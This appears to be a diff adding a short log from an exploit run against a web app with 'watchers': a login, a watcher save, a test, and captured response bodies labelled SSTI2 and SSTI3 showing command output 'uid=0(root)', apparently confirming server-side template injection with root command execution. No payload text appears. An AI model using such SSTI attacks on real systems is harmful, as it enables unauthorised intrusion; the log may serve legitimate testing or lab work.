@@ -1,0 +1,13 @@
+login 302 /dashboard
+save 302 /watchers/watch-01
+test 302
+no ENUM1 capture; latest bodies:
+--- 2026-11-08 01:21:39 SSTI3
+uid=0(root) gid=0(root) groups=0(root)
+
+--- 2026-11-08 01:21:39 SSTI3
+uid=0(root) gid=0(root) groups=0(root)
+
+--- 2026-11-08 01:21:34 SSTI2
+uid=0(root) gid=0(root) groups=0(root)
+
